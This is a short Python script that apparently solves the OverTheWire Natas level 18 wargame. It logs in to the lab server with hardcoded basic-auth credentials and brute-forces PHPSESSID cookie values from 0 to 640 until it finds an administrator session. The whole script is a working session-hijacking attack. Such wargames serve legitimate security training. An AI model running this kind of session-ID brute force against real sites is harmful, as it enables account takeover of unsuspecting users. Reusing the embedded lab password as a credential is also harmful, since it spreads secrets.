#!/usr/bin/env python3
import requests

endIndex = 0
usernm = "natas18"
passwd = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
url = "http://natas18.natas.labs.overthewire.org"
url2 = "http://natas18.natas.labs.overthewire.org/index.php"
session = requests.Session()
PHPSESSID = 0

while (PHPSESSID <= 640):
    print(f"Trying: {PHPSESSID}")
    res = session.post(url, cookies = {"PHPSESSID":str(PHPSESSID)}, data = {"username":"natas19", "password":"blahblahblah"}, auth = (usernm, passwd))
    if ("You are an admin" in res.text):
        print(res.text)
        break
    PHPSESSID += 1
